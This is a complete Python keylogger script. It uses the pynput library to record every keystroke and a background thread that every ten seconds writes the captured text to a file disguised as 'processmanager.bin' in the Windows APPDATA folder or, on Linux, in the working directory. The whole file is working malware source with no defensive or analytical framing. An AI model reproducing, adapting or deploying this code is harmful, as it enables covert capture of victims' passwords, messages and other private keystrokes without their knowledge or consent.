#!/usr/bin/python3
from pynput import keyboard
import threading
import os
import time

log = ""
path = ''


def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + ' '
        elif key == key.right or key == key.left or key == key.up or key == key.down:
            log = log + ''
        else:
            log = log + ' ' + str(key) + ' '
    print(log)


def report():
    global log
    global path
    while True:
        time.sleep(10)
        fin = open(path, 'a')
        fin.write(log)
        log = ''
        fin.close()


def os_type():
    global path
    if os.path.exists('/root'):
        print('FODASS: 1')
        path = './processmanager.bin' # just for testing purposes
    else:
        print('FODASS: 1')
        path = os.environ['appdata'] + '\\processmanager.bin'


def start():
    os_type()
    keyboard_listener = keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        timer = threading.Thread(target=report, name='Report')
        timer.start()
        keyboard_listener.join()


if __name__ == '__main__':
    start()
